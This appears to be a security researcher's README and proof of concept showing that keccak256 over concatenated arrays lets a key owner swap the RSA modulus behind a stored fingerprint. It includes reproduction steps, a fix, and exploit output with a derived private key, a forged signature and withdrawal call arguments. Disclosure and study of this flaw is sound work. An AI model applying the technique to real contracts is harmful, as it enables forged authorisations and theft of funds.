# RSA public key fingerprint manipulation. 

## Description:
This example based on that keccak256 behavior:
```
keccak256("foo", "bar") == keccak256("fo", "obar")
```
Pretty interesting, right? That's works for any arrays (`String` is bytes array actually)

### Legend:
I've discovered this trick by auditing DAO.casino [contracts](https://github.com/DaoCasino/Protocol/blob/f958ecbd774c1fe0f4be5c918e2a6c065ec97296/contracts/core/oneStepGame.sol#L164), so this example related to storing a fingerprint of public RSA key by contract.
 Smartcontract may store it like that:
```
bytes32 fingerprint = keccak256(N, e); // N and e are bytes arrays
``` 
This way of public key fingerprint storing gives to key owner an opportunity to manipulate N (and e) within wide limits. And so manipulate the secret key. 

Check `index.js.es6` output below. 
### To reproduce:
1. Copy-paste `crate.sol` to remix (or use `Connect to localhost` feature) and deploy `Crate` contract.
2. `npm i`
3. Replace original `cryptico.js` to a `cryptico.js` from this repo. (I put `RSAGenerateByPQ` func there)
4. run `index.js.es6`. Output is self-explained.
5. Happy hack!

### The correct way to store RSA pub key fingerprint
Just use Merkle tree :)
```
bytes32 fingerprint = keccak256(keccak256(N), keccak256(e));
```

### Can Ethereum foundation fix that behavior?
I suppose no. The TupleHash function should be implemented (as part of cSHAKE) to fix that, but consensys would be broken (Ethereum uses [SHAKE](https://github.com/ethereum/ethash/blob/master/src/libethash/sha3.c#L3) only).
More information at [SHA-3 Derived Functions:cSHAKE, KMAC, TupleHash and ParallelHash](https://nvlpubs.nist.gov/nistpubs/specialpublications/nist.sp.800-185.pdf) publication.

### index.js.es6 output
```
Let's imagine someone have generated RSA keys and sent public one to Crate smartcontract
N 8fe590a2f9c8cecef2917ab577ca221091c8a092c72f61cd00b12f928500e150c53857b68f1590f0811c1d5f8414254149040bae800c6fcfe7fbff40f8e00503
e 10001
Args for submitPubKey() ["0x8f", "0xe5", "0x90", "0xa2", "0xf9", "0xc8", "0xce", "0xce", "0xf2", "0x91", "0x7a", "0xb5", "0x77", "0xca", "0x22", "0x10", "0x91", "0xc8", "0xa0", "0x92", "0xc7", "0x2f", "0x61", "0xcd", "0x00", "0xb1", "0x2f", "0x92", "0x85", "0x00", "0xe1", "0x50", "0xc5", "0x38", "0x57", "0xb6", "0x8f", "0x15", "0x90", "0xf0", "0x81", "0x1c", "0x1d", "0x5f", "0x84", "0x14", "0x25", "0x41", "0x49", "0x04", "0x0b", "0xae", "0x80", "0x0c", "0x6f", "0xcf", "0xe7", "0xfb", "0xff", "0x40", "0xf8", "0xe0", "0x05", "0x03"] , ["0x01", "0x00", "0x01"]
(Don't forget send some Ether too)

Now, you can return your Ether from Crate by returnETH call
This is a msg (address to return padded to 32 bytes) 0x0000000000000000000000004b0897b0513fdc7c541b6d9d7e929c4e5364d2db
This is a sign of addr 0x12c250a99eee73b43dfdb3cad25186f6b6944b51bee0b52041248bdedeb01d587f846a216aed3698792b630db822f79f4b8573e02f19dc7a880c004a28e48b6f
Let's check the sign. Result is  true
Ok, args for returnETH() are ["0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x4b", "0x08", "0x97", "0xb0", "0x51", "0x3f", "0xdc", "0x7c", "0x54", "0x1b", "0x6d", "0x9d", "0x7e", "0x92", "0x9c", "0x4e", "0x53", "0x64", "0xd2", "0xdb"] , ["0x8f", "0xe5", "0x90", "0xa2", "0xf9", "0xc8", "0xce", "0xce", "0xf2", "0x91", "0x7a", "0xb5", "0x77", "0xca", "0x22", "0x10", "0x91", "0xc8", "0xa0", "0x92", "0xc7", "0x2f", "0x61", "0xcd", "0x00", "0xb1", "0x2f", "0x92", "0x85", "0x00", "0xe1", "0x50", "0xc5", "0x38", "0x57", "0xb6", "0x8f", "0x15", "0x90", "0xf0", "0x81", "0x1c", "0x1d", "0x5f", "0x84", "0x14", "0x25", "0x41", "0x49", "0x04", "0x0b", "0xae", "0x80", "0x0c", "0x6f", "0xcf", "0xe7", "0xfb", "0xff", "0x40", "0xf8", "0xe0", "0x05", "0x03"] , ["0x01", "0x00", "0x01"],["0x12", "0xc2", "0x50", "0xa9", "0x9e", "0xee", "0x73", "0xb4", "0x3d", "0xfd", "0xb3", "0xca", "0xd2", "0x51", "0x86", "0xf6", "0xb6", "0x94", "0x4b", "0x51", "0xbe", "0xe0", "0xb5", "0x20", "0x41", "0x24", "0x8b", "0xde", "0xde", "0xb0", "0x1d", "0x58", "0x7f", "0x84", "0x6a", "0x21", "0x6a", "0xed", "0x36", "0x98", "0x79", "0x2b", "0x63", "0x0d", "0xb8", "0x22", "0xf7", "0x9f", "0x4b", "0x85", "0x73", "0xe0", "0x2f", "0x19", "0xdc", "0x7a", "0x88", "0x0c", "0x00", "0x4a", "0x28", "0xe4", "0x8b", "0x6f"]
That's is usual way...

Now let's hack!
Cause of keccak256("foo", "bar") == keccak256("fo", "obar"), we can cut N and find p and q for new N*
New N 8fe590a2f9c8cecef2917ab577ca221091c8a092c72f61cd00b12f928500e150c53857b68f1590f0811c1d5f8414254149040bae800c6fcfe7fbff40f8e005
New e 03010001
Notice, new N is shorter than the previous one

New N has multiple dividers. They can be computed at https://www.alpertron.com.ar/ECM.HTM e.g.
p 609dbb46adc57f706a399d8b13469d19e1f62f3585c1ec4235983c676fb86be4981e42c40e6c0af8188a76ca0ccbb
q [ '05', 'e642659687', '54c7b45346aba588c1d1db5' ]
Notice, I'm using biggest prime as p and multiplication of rest as q

New secret key (d) is 681f02e3d6bc700aa76569b38d352ca6caa96d2039cb99b0ce07ff458fbbe489ec4acaffca4b3938fb8fc7035eab52722aad2c48c958300d3c2a2ce65765c1
New message (hacker addr) 0x0000000000000000000000004b0897b0513fdc7c541b6d9d7e929c4e5364d2db
Let's sign that with a new key d 3197d09f5d772da052c6a78d9f456d4cd2be36e502ab2717036df7bb017a32760250555a762f35246d9e2cdbbed52bc93608ea76dfd244202471bc389d7b46
Check sign. Result is  true
Final step!
Args for returnETH() ["0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x00", "0x4b", "0x08", "0x97", "0xb0", "0x51", "0x3f", "0xdc", "0x7c", "0x54", "0x1b", "0x6d", "0x9d", "0x7e", "0x92", "0x9c", "0x4e", "0x53", "0x64", "0xd2", "0xdb"] , ["0x8f", "0xe5", "0x90", "0xa2", "0xf9", "0xc8", "0xce", "0xce", "0xf2", "0x91", "0x7a", "0xb5", "0x77", "0xca", "0x22", "0x10", "0x91", "0xc8", "0xa0", "0x92", "0xc7", "0x2f", "0x61", "0xcd", "0x00", "0xb1", "0x2f", "0x92", "0x85", "0x00", "0xe1", "0x50", "0xc5", "0x38", "0x57", "0xb6", "0x8f", "0x15", "0x90", "0xf0", "0x81", "0x1c", "0x1d", "0x5f", "0x84", "0x14", "0x25", "0x41", "0x49", "0x04", "0x0b", "0xae", "0x80", "0x0c", "0x6f", "0xcf", "0xe7", "0xfb", "0xff", "0x40", "0xf8", "0xe0", "0x05"] , ["0x03", "0x01", "0x00", "0x01"],["0x31", "0x97", "0xd0", "0x9f", "0x5d", "0x77", "0x2d", "0xa0", "0x52", "0xc6", "0xa7", "0x8d", "0x9f", "0x45", "0x6d", "0x4c", "0xd2", "0xbe", "0x36", "0xe5", "0x02", "0xab", "0x27", "0x17", "0x03", "0x6d", "0xf7", "0xbb", "0x01", "0x7a", "0x32", "0x76", "0x02", "0x50", "0x55", "0x5a", "0x76", "0x2f", "0x35", "0x24", "0x6d", "0x9e", "0x2c", "0xdb", "0xbe", "0xd5", "0x2b", "0xc9", "0x36", "0x08", "0xea", "0x76", "0xdf", "0xd2", "0x44", "0x20", "0x24", "0x71", "0xbc", "0x38", "0x9d", "0x7b", "0x46"]
```